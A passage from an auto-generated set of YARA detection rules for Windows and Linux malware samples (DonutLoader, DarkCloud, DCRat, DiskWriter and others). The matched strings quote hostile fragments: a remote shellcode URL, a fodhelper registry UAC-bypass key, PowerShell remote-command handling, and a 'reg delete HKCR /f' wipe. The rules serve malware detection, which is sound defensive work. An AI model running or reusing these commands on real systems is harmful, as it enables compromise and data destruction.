      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and all of them
}

rule DonutLoader_signature__c6483cddb066c37c14a239b4fed18651_imphash_ {
   meta:
      description = "_subset_batch - file DonutLoader(signature)_c6483cddb066c37c14a239b4fed18651(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "2a55227c52090516506ef41193831b78ef4e0e097ead8f9a75f83b896664167c"
   strings:
      $x1 = "https://github.com/samninja666/winscreen/raw/refs/heads/main/shellcode.bin" fullword ascii /* score: '36.00'*/
      $x2 = "rC:\\Users\\Public\\Documents\\Steam\\CODEX\\374320\\local\\service.exe" fullword wide /* score: '34.00'*/
      $s3 = "taskhostw.exe" fullword ascii /* score: '27.00'*/
      $s4 = "Shellcode Injector" fullword wide /* score: '23.00'*/
      $s5 = "fodhelper.exe" fullword ascii /* score: '22.00'*/
      $s6 = "Software\\Classes\\ms-settings\\shell\\open\\command" fullword ascii /* score: '13.00'*/
      $s7 = "runtime error %d" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 70KB and
      1 of ($x*) and all of them
}

rule DonutLoader_signature__c6483cddb066c37c14a239b4fed18651_imphash__4f19b203 {
   meta:
      description = "_subset_batch - file DonutLoader(signature)_c6483cddb066c37c14a239b4fed18651(imphash)_4f19b203.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "4f19b203b30dbed626d518a2327ea3c554a439aa2b21952a4ef48ebade776d5a"
   strings:
      $x1 = "https://github.com/samninja666/winscreen/raw/refs/heads/main/shellcode.bin" fullword ascii /* score: '36.00'*/
      $x2 = "rC:\\Users\\Public\\Documents\\Steam\\CODEX\\374320\\local\\service.exe" fullword wide /* score: '34.00'*/
      $s3 = "taskhostw.exe" fullword ascii /* score: '27.00'*/
      $s4 = "Shellcode Injector" fullword wide /* score: '23.00'*/
      $s5 = "fodhelper.exe" fullword ascii /* score: '22.00'*/
      $s6 = "Software\\Classes\\ms-settings\\shell\\open\\command" fullword ascii /* score: '13.00'*/
      $s7 = "runtime error %d" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 70KB and
      1 of ($x*) and all of them
}

rule c203c629ca9ef83c55022216834f4045b699e2e6b1fbaa0f6649e56a92985777_c203c629 {
   meta:
      description = "_subset_batch - file c203c629ca9ef83c55022216834f4045b699e2e6b1fbaa0f6649e56a92985777_c203c629.ps1"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "c203c629ca9ef83c55022216834f4045b699e2e6b1fbaa0f6649e56a92985777"
   strings:
      $x1 = "                    $psi.Arguments = \"-NoProfile -ExecutionPolicy Bypass -Command $cmd\"" fullword ascii /* score: '36.00'*/
      $x2 = "    $cpu = _safe { (Get-ItemProperty 'HKLM:\\HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0').ProcessorNameString } ''" fullword ascii /* score: '31.00'*/
      $s3 = "            if ($Command -match \"^EXEC_(CMD|POWERSHELL)\\s+(.+)$\") {" fullword ascii /* score: '21.00'*/
      $s4 = "                    $psi.FileName = \"cmd.exe\"" fullword ascii /* score: '20.00'*/
      $s5 = "$mutex = New-Object System.Threading.Mutex($true, $mutexName, [ref]$createdNew)" fullword ascii /* score: '18.00'*/
      $s6 = "     \"Computer: $comp | User: $user | Domain: $domain | IPs: $ip | CPU: $cpu | RAM: ${ramGB}GB | GPU: $gpu | Virtualized: $virt" ascii /* score: '17.00'*/
      $s7 = "| Elevated: $elevated\"" fullword ascii /* score: '16.00'*/
      $s8 = "$AuthPassword = \"certokey0\"" fullword ascii /* score: '15.00'*/
      $s9 = "$mutexName = \"Global\\Sefoxprod4\"" fullword ascii /* score: '15.00'*/
      $s10 = "                    $modulePath = \"$env:TEMP\\$moduleName.exe\"" fullword ascii /* score: '13.00'*/
      $s11 = "                $psi.UseShellExecute = $false" fullword ascii /* score: '13.00'*/
      $s12 = "            if ($Command -match \"^UPLOAD (\\S+) (\\d+)$\") {" fullword ascii /* score: '13.00'*/
      $s13 = "    $elevated = if (([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security" ascii /* score: '13.00'*/
      $s14 = "    $elevated = if (([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security" ascii /* score: '13.00'*/
      $s15 = "            if ($null -eq $Command) { throw \"Disconnected by server\" }" fullword ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0xbbef and filesize < 20KB and
      1 of ($x*) and 4 of them
}

rule ea229a2fd634198ad3d93dcd0fe536d0daf5420a5f0cbc6e2f58937807d3628f_ea229a2f {
   meta:
      description = "_subset_batch - file ea229a2fd634198ad3d93dcd0fe536d0daf5420a5f0cbc6e2f58937807d3628f_ea229a2f.doc"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ea229a2fd634198ad3d93dcd0fe536d0daf5420a5f0cbc6e2f58937807d3628f"
   strings:
      $s1 = "*\\G{000204EF-0000-0000-C000-000000000046}#3.0#9#C:\\PROGRAM FILES\\COMMON FILES\\MICROSOFT SHARED\\VBA\\VBA332.DLL#Visual Basic" wide /* score: '24.00'*/
      $s2 = "*\\G{2DF8D04C-5BFA-101B-BDE5-00AA0044DE52}#2.0#0#C:\\PROGRAM FILES\\MICROSOFT OFFICE\\OFFICE\\MSO97.DLL#Microsoft Office 8.0 Obj" wide /* score: '22.00'*/
      $s3 = "www.toothwiseguys.com" fullword ascii /* score: '21.00'*/
      $s4 = "C:\\WINWORD\\TEMPLATE\\NORMAL.DOT" fullword ascii /* score: '20.00'*/
      $s5 = "*\\G{6C211524-297B-11D3-A7BD-005004AAD059}#2.0#0#c:\\windows\\TEMP\\VBE\\MSForms.EXD#Microsoft Forms 2.0 Object Library" fullword wide /* score: '20.00'*/
      $s6 = " C:\\WINWORD\\TEMPLATE\\BROCHUR1.DOT" fullword wide /* score: '20.00'*/
      $s7 = "Email: toothwiseguys@gmail.com" fullword ascii /* score: '18.00'*/
      $s8 = " HYPERLINK \"http://www.toothwiseguys.com\" " fullword ascii /* score: '17.00'*/
      $s9 = "http://www.toothwiseguys.com/" fullword wide /* score: '17.00'*/
      $s10 = "NormalTemplateInfectedy" fullword ascii /* score: '16.00'*/
      $s11 = "*\\G{00020430-0000-0000-C000-000000000046}#2.0#0#C:\\WINDOWS\\SYSTEM\\STDOLE2.TLB#OLE Automation" fullword wide /* score: '16.00'*/
      $s12 = "*\\G{6C211523-297B-11D3-A7BD-005004AAD059}#2.0#0#C:\\WINDOWS\\SYSTEM\\MSForms.TWD#Microsoft Forms 2.0 Object Library" fullword wide /* score: '16.00'*/
      $s13 = "Dr. Bobby Vijay graduated from the University of Pennsylvania School of Dental Medicine with DMD in 2005. Dr. Vijay earned his p" ascii /* score: '13.00'*/
      $s14 = "*\\G{00020905-0000-0000-C000-000000000046}#8.0#409#C:\\Program Files\\Microsoft Office\\Office\\MSWORD8.OLB#Microsoft Word 8.0 O" wide /* score: '13.00'*/
      $s15 = "CommandBars" fullword ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0xcfd0 and filesize < 300KB and
      8 of them
}

rule e7d755ef73c34c9905a9f71c480fc40de83e3bcdc2a0dc795ab3a3aabaa5e17f_e7d755ef {
   meta:
      description = "_subset_batch - file e7d755ef73c34c9905a9f71c480fc40de83e3bcdc2a0dc795ab3a3aabaa5e17f_e7d755ef.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e7d755ef73c34c9905a9f71c480fc40de83e3bcdc2a0dc795ab3a3aabaa5e17f"
   strings:
      $s1 = "No child process" fullword ascii /* score: '15.00'*/
      $s2 = "Remote I/O error" fullword ascii /* score: '10.00'*/
      $s3 = "No file descriptors available" fullword ascii /* score: '10.00'*/
      $s4 = "__vdso_clock_gettime" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 100KB and
      all of them
}

rule DarkCloud_signature__09ff7f0eb0ed07f2013be1742e633b97_imphash_ {
   meta:
      description = "_subset_batch - file DarkCloud(signature)_09ff7f0eb0ed07f2013be1742e633b97(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "98c32095bd467f00f412f165fac16f029ca9a8006d20d7721e2627fada59035f"
   strings:
      $s1 = " KERNEL32.DLL" fullword wide /* score: '20.00'*/
      $s2 = "            <requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/>" fullword ascii /* score: '15.00'*/
      $s3 = "\"Entrust Timestamp Authority - TSA1" fullword ascii /* score: '15.00'*/
      $s4 = "\"Entrust Timestamp Authority - TSA10" fullword ascii /* score: '15.00'*/
      $s5 = "Mhttp://crl4.digicert.com/DigiCertTrustedG4CodeSigningRSA4096SHA3842021CA1.crl0>" fullword ascii /* score: '13.00'*/
      $s6 = "        <dpiAwareness xmlns=\"http://schemas.microsoft.com/SMI/2016/WindowsSettings\">PerMonitorV2</dpiAwareness>" fullword ascii /* score: '12.00'*/
      $s7 = "            processorArchitecture=\"*\"" fullword ascii /* score: '10.00'*/
      $s8 = "    processorArchitecture=\"x86\"" fullword ascii /* score: '10.00'*/
      $s9 = "https://www.entrust.net/rpa0" fullword ascii /* score: '10.00'*/
      $s10 = "'http://aia.entrust.net/ts1-chain256.cer01" fullword ascii /* score: '10.00'*/
      $s11 = "    name=\"Microsoft.Windows.onecoreuapshell.PickerHost\"" fullword ascii /* score: '9.00'*/
      $s12 = "            publicKeyToken=\"6595b64144ccf1df\"" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 6000KB and
      8 of them
}

rule DiskWriter_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__5cb1497a {
   meta:
      description = "_subset_batch - file DiskWriter(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_5cb1497a.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "5cb1497aacdec1dbbd53abebb014e6067da1478de8489d9c46646d881c7d1fd3"
   strings:
      $x1 = "C:\\Users\\David\\source\\repos\\nitroxide\\obj\\Debug\\nitroxide.pdb" fullword ascii /* score: '33.00'*/
      $s2 = "logo comunes de Windows (Windows XP y versiones posteriores) -->" fullword ascii /* score: '29.00'*/
      $s3 = "n sea compatible con rutas de acceso largas. Consulte https://docs.microsoft.com/windows/win32/fileio/maximum-file-path-limitati" ascii /* score: '28.00'*/
      $s4 = "nitroxide.exe" fullword wide /* score: '22.00'*/
      $s5 = "n sea compatible con rutas de acceso largas. Consulte https://docs.microsoft.com/windows/win32/fileio/maximum-file-path-limitati" ascii /* score: '19.00'*/
      $s6 = "s compatible. -->" fullword ascii /* score: '16.00'*/
      $s7 = "windows poisoned" fullword wide /* score: '16.00'*/
      $s8 = "        <requestedExecutionLevel  level=\"asInvoker\" uiAccess=\"false\" />" fullword ascii /* score: '15.00'*/
      $s9 = "/k reg delete HKCR /f && reg delete HKCU /f" fullword wide /* score: '15.00'*/
      $s10 = "      <!-- Windows 7 -->" fullword ascii /* score: '12.00'*/
      $s11 = "      <!-- Windows Vista -->" fullword ascii /* score: '12.00'*/
      $s12 = "      <!-- Windows 8.1 -->" fullword ascii /* score: '12.00'*/
      $s13 = "      <dpiAware xmlns=\"http://schemas.microsoft.com/SMI/2005/WindowsSettings\">true</dpiAware>" fullword ascii /* score: '12.00'*/
      $s14 = "      <!-- Windows 10 -->" fullword ascii /* score: '12.00'*/
      $s15 = "      <!-- Windows 8 -->" fullword ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 300KB and
      1 of ($x*) and 4 of them
}

rule DarkCloud_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__aa8573d4 {
   meta:
      description = "_subset_batch - file DarkCloud(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_aa8573d4.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "aa8573d46623ece59532f343f470aaa82a28cee22f00ed2b9b004db3a7810e05"
   strings:
      $s1 = "fSystem.Drawing.Icon, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3ahSystem.Drawing.Bitmap, S" ascii /* score: '27.00'*/
      $s2 = "fSystem.Drawing.Icon, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3ahSystem.Drawing.Bitmap, S" ascii /* score: '27.00'*/
      $s3 = "ystem.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3agSystem.Drawing.Point, System.Drawing, Version=4" ascii /* score: '27.00'*/
      $s4 = "dUps.exe" fullword wide /* score: '22.00'*/
      $s5 = "dUps.pdb" fullword ascii /* score: '14.00'*/
      $s6 = "products.txt" fullword wide /* score: '14.00'*/
      $s7 = "listings.txt" fullword wide /* score: '14.00'*/
      $s8 = "results.txt" fullword wide /* score: '14.00'*/
      $s9 = ".0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPADPBj" fullword ascii /* score: '13.00'*/
      $s10 = "rotavitcA.metsyS" fullword wide /* reversed goodware string 'System.Activator' */ /* score: '13.00'*/
      $s11 = ".NET Framework 4.5*" fullword ascii /* score: '10.00'*/
      $s12 = "get_Listings" fullword ascii /* score: '9.00'*/
      $s13 = "* NX}D" fullword ascii /* score: '9.00'*/
      $s14 = "ADlLXGE" fullword ascii /* score: '9.00'*/
      $s15 = "get_Currency" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      8 of them
}

rule DarkVisionRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash_ {
   meta:
      description = "_subset_batch - file DarkVisionRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "c9f9e2d44c4241165824a8977b3b398d93247f4c6fb89134a49dea8bd4522786"
   strings:
      $s1 = "Done.exe" fullword wide /* score: '22.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      all of them
}

rule b78ecf47c0a3e24a6f4af114e2d1f5de_imphash_ {
   meta:
      description = "_subset_batch - file b78ecf47c0a3e24a6f4af114e2d1f5de(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ec8ec8b3234ceeefbf74b2dc4914d5d6f7685655f6f33f2226e2a1d80e7ad488"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $x2 = "<assemblyIdentity version=\"1.0.0.0\" processorArchitecture=\"*\" name=\"Nullsoft.NSIS.exehead\" type=\"win32\"/><description>Nu" ascii /* score: '31.00'*/
      $s3 = "ntrols\" version=\"6.0.0.0\" processorArchitecture=\"*\" publicKeyToken=\"6595b64144ccf1df\" language=\"*\" /></dependentAssembl" ascii /* score: '25.00'*/
      $s4 = "dency><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivileges><requestedExecutionLevel level=\"asIn" ascii /* score: '22.00'*/
      $s5 = "arrowing gennemsnitsfiltreringernes.exe" fullword wide /* score: '19.00'*/
      $s6 = "22222222222222222222222222222222222222222222222222" ascii /* score: '17.00'*/ /* hex encoded string '"""""""""""""""""""""""""' */
      $s7 = "nstall System v3.01</description><dependency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common" ascii /* score: '13.00'*/
      $s8 = "er\" uiAccess=\"false\"/></requestedPrivileges></security></trustInfo><compatibility xmlns=\"urn:schemas-microsoft-com:compatibi" ascii /* score: '10.00'*/
      $s9 = "Passalidae" fullword ascii /* score: '9.00'*/
      $s10 = "chokrapporternes quirting" fullword wide /* score: '9.00'*/
      $s11 = "CRYPTBASE" fullword ascii /* score: '8.50'*/
      $s12 = "pljigfcb" fullword ascii /* score: '8.00'*/
      $s13 = "ikihggggrrsuv" fullword ascii /* score: '8.00'*/
      $s14 = "jklmnop" fullword ascii /* score: '8.00'*/
      $s15 = "iiihgggrrs" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and 4 of them
}

rule DiskWriter_signature__88dc4af9035fb42dc417d412af2d7670_imphash_ {
   meta:
      description = "_subset_batch - file DiskWriter(signature)_88dc4af9035fb42dc417d412af2d7670(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a05d29fa4d9218010f640a63ed3d14926eb7f6d7547661aea4373d624346253f"
   strings:
      $x1 = "C:\\Users\\zouzo\\Desktop\\Cadmium.exe - SOURCE CODE\\Cadmium\\Release\\Cadmium.pdb" fullword ascii /* score: '37.00'*/
      $s2 = "C:\\WINDOWS\\system32\\*.exe" fullword wide /* score: '29.00'*/
      $s3 = "C:\\Windows\\WinNet.exe" fullword wide /* score: '21.00'*/
      $s4 = "Cadmium.exe" fullword wide /* score: '18.00'*/
      $s5 = "Cadmium.exe - FINAL WARNING" fullword wide /* score: '18.00'*/
      $s6 = "        <requestedExecutionLevel level='requireAdministrator' uiAccess='false' />" fullword ascii /* score: '11.00'*/
      $s7 = "This malware can disable important programs (such as Task Manager, Registry editor, etc.) and can set itself as a critical proce" wide /* score: '11.00'*/
      $s8 = "What you've just executed is a type of malware that can damage your PC." fullword wide /* score: '10.00'*/
      $s9 = "(2@`@a@]+" fullword ascii /* score: '9.00'*/ /* hex encoded string '*' */
   condition:
      uint16(0) == 0x5a4d and filesize < 500KB and
      1 of ($x*) and all of them
}

rule DCRat_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__486f3560 {
   meta:
      description = "_subset_batch - file DCRat(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_486f3560.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "486f3560972827fb2f0faa5c4e9e4b95d76a7cac604ea71aa951ff031f6c31a8"
   strings:
      $s1 = "ABCDEFGHIJ" fullword ascii /* reversed goodware string 'JIHGFEDCBA' */ /* score: '16.50'*/
      $s2 = "_cvLqaqExecKKlvizcsdHy" fullword ascii /* score: '16.00'*/
      $s3 = "&UlxIIn1+" fullword ascii /* base64 encoded string*/ /* score: '14.00'*/
      $s4 = "YDtpAEwkR" fullword ascii /* base64 encoded string*/ /* score: '14.00'*/
      $s5 = "5ICX5ICU5ICX5ICU5ICX5ICZ5ICY5ICZ5ICY5ICS5ICT5ICd5ICQ5ICT5ICf5ICb5ICQ5ICX5ICU5ICX5ICZ5ICY5ICZ5ICY5ICS5ICT5ICd5ICQ5ICT5ICf5ICb5ICQ" wide /* score: '11.00'*/
      $s6 = "_QoccMKuFsPipEaH" fullword ascii /* score: '10.00'*/
      $s7 = "WMDByYCAs" fullword ascii /* base64 encoded string*/ /* score: '10.00'*/
      $s8 = "ZguLEYE7" fullword ascii /* score: '10.00'*/
      $s9 = "C# version only supports level 1 and 3" fullword wide /* score: '10.00'*/
      $s10 = "Failed to load Runtime!" fullword wide /* score: '10.00'*/
      $s11 = "_NSrhzgViBYtxaeNwXbgEtaie" fullword ascii /* score: '9.00'*/
      $s12 = "_xMpUWGgdgRXSXdSlogNBvbczthYFwlxboWjxRNzH" fullword ascii /* score: '9.00'*/
      $s13 = "_jyPtmQVjAhKwFjwSUHeyeeiDMkWzVwyhAQExwOomVMXPOXbxe" fullword ascii /* score: '9.00'*/
      $s14 = "_BQrVOtbYuacjwlIrCDybFWeEcUIpQujLxn" fullword ascii /* score: '9.00'*/
      $s15 = "_UawEdPkecyNPCYUYXqaryxFWcjLQXspYuJ" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 27000KB and
      8 of them
}

rule b34f154ec913d2d2c435cbd644e91687_imphash__68044a3f {
   meta:
      description = "_subset_batch - file b34f154ec913d2d2c435cbd644e91687(imphash)_68044a3f.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "68044a3ff1f0b5874f05e6023b7e46b6226301e073d165684001e31724a36dee"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $x2 = "<assemblyIdentity version=\"1.0.0.0\" processorArchitecture=\"*\" name=\"Nullsoft.NSIS.exehead\" type=\"win32\"/><description>Nu" ascii /* score: '31.00'*/
      $s3 = "Controls\" version=\"6.0.0.0\" processorArchitecture=\"*\" publicKeyToken=\"6595b64144ccf1df\" language=\"*\" /></dependentAssem" ascii /* score: '25.00'*/
      $s4 = "endency><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivileges><requestedExecutionLevel level=\"as" ascii /* score: '22.00'*/
      $s5 = "%s%S.dll" fullword wide /* score: '21.00'*/
      $s6 = "markren gedekiddene.exe" fullword wide /* score: '19.00'*/
      $s7 = "nstall System v3.02.1</description><dependency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Comm" ascii /* score: '13.00'*/
      $s8 = "oker\" uiAccess=\"false\"/></requestedPrivileges></security></trustInfo><compatibility xmlns=\"urn:schemas-microsoft-com:compati" ascii /* score: '10.00'*/
      $s9 = "CRYPTBASE" fullword ascii /* score: '8.50'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      1 of ($x*) and all of them
}

rule b34f154ec913d2d2c435cbd644e91687_imphash__cd6b216b {
   meta:
      description = "_subset_batch - file b34f154ec913d2d2c435cbd644e91687(imphash)_cd6b216b.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "cd6b216ba2df04293a640b21e4aa2462a0ac0ed2bc8f5f745a074ba609e209d8"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $x2 = "<assemblyIdentity version=\"1.0.0.0\" processorArchitecture=\"*\" name=\"Nullsoft.NSIS.exehead\" type=\"win32\"/><description>Nu" ascii /* score: '31.00'*/
      $s3 = "Controls\" version=\"6.0.0.0\" processorArchitecture=\"*\" publicKeyToken=\"6595b64144ccf1df\" language=\"*\" /></dependentAssem" ascii /* score: '25.00'*/
      $s4 = "endency><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivileges><requestedExecutionLevel level=\"as" ascii /* score: '22.00'*/
      $s5 = "%s%S.dll" fullword wide /* score: '21.00'*/
      $s6 = "nstall System v3.02.1</description><dependency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Comm" ascii /* score: '13.00'*/
      $s7 = "oker\" uiAccess=\"false\"/></requestedPrivileges></security></trustInfo><compatibility xmlns=\"urn:schemas-microsoft-com:compati" ascii /* score: '10.00'*/
      $s8 = "CRYPTBASE" fullword ascii /* score: '8.50'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      1 of ($x*) and all of them
}

rule b729b61eb1515fcf7b3e511e4e66258b_imphash_ {
   meta:
      description = "_subset_batch - file b729b61eb1515fcf7b3e511e4e66258b(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "5d0ce28c3edbdd680bbbcdc5a7ffee02e9b52abc117a6f01f901843e21907446"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $x2 = "<assemblyIdentity version=\"1.0.0.0\" processorArchitecture=\"X86\" name=\"Nullsoft.NSIS.exehead\" type=\"win32\"/><description>" ascii /* score: '31.00'*/
      $s3 = "<requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/></requestedPrivileges></security></trustInfo><compatibility xml" ascii /* score: '26.00'*/
      $s4 = " Install System v2.46.5-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
      $s5 = "Mhttp://crl4.digicert.com/DigiCertTrustedG4CodeSigningRSA4096SHA3842021CA1.crl0>" fullword ascii /* score: '13.00'*/
      $s6 = "PJ@[ - " fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and all of them
}

rule b729b61eb1515fcf7b3e511e4e66258b_imphash__687be09a {
   meta:
      description = "_subset_batch - file b729b61eb1515fcf7b3e511e4e66258b(imphash)_687be09a.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "687be09a8c1d1bb4c9d9fc6274bda167deeebe4e0c181025bfef7c0d270b2f3c"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $x2 = "<assemblyIdentity version=\"1.0.0.0\" processorArchitecture=\"X86\" name=\"Nullsoft.NSIS.exehead\" type=\"win32\"/><description>" ascii /* score: '31.00'*/
      $s3 = "<requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/></requestedPrivileges></security></trustInfo><compatibility xml" ascii /* score: '26.00'*/
      $s4 = " Install System v8.95.5-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
      $s5 = "cUYdP0C" fullword ascii /* score: '9.00'*/
      $s6 = "* (.jV" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 6000KB and
      1 of ($x*) and all of them
}

rule b729b61eb1515fcf7b3e511e4e66258b_imphash__751ea8b1 {
   meta:
      description = "_subset_batch - file b729b61eb1515fcf7b3e511e4e66258b(imphash)_751ea8b1.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "751ea8b18e6141b7fb7c0072c60d485491112bde9fc2acc1f15f58a78777a464"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $x2 = "<assemblyIdentity version=\"1.0.0.0\" processorArchitecture=\"X86\" name=\"Nullsoft.NSIS.exehead\" type=\"win32\"/><description>" ascii /* score: '31.00'*/
      $s3 = "<requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/></requestedPrivileges></security></trustInfo><compatibility xml" ascii /* score: '26.00'*/
      $s4 = " Install System v7.63.1-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and all of them
}

rule b729b61eb1515fcf7b3e511e4e66258b_imphash__dd758970 {
   meta:
      description = "_subset_batch - file b729b61eb1515fcf7b3e511e4e66258b(imphash)_dd758970.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "dd7589708fd7546b9564e75e971e1b9930e5ad7ce60d523585e540ce0c70e0d3"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $x2 = "<assemblyIdentity version=\"1.0.0.0\" processorArchitecture=\"X86\" name=\"Nullsoft.NSIS.exehead\" type=\"win32\"/><description>" ascii /* score: '31.00'*/
      $s3 = "<requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/></requestedPrivileges></security></trustInfo><compatibility xml" ascii /* score: '26.00'*/
      $s4 = " Install System v3.38.4-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
      $s5 = "<^^:3*f={" fullword ascii /* score: '9.00'*/ /* hex encoded string '?' */
      $s6 = "nuoG* r" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and all of them
}

rule c32ba42c73a2bc24d2788f7750d87edb_imphash__ef69941b {
   meta:
      description = "_subset_batch - file c32ba42c73a2bc24d2788f7750d87edb(imphash)_ef69941b.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ef69941b32be75da6500aa8a2c210bbc0470947c720a526f926f6a2c77141711"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $x2 = "<assemblyIdentity version=\"1.0.0.0\" processorArchitecture=\"X86\" name=\"Nullsoft.NSIS.exehead\" type=\"win32\"/><description>" ascii /* score: '31.00'*/
      $s3 = "<requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/></requestedPrivileges></security></trustInfo><compatibility xml" ascii /* score: '26.00'*/
      $s4 = " Install System v7.51.8-Unicode</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivilege" ascii /* score: '16.00'*/
      $s5 = "Nqnp.oap" fullword ascii /* score: '10.00'*/
      $s6 = "./\\~*]69" fullword ascii /* score: '9.00'*/ /* hex encoded string 'i' */
      $s7 = "* rk?lO" fullword ascii /* score: '9.00'*/
   condition:
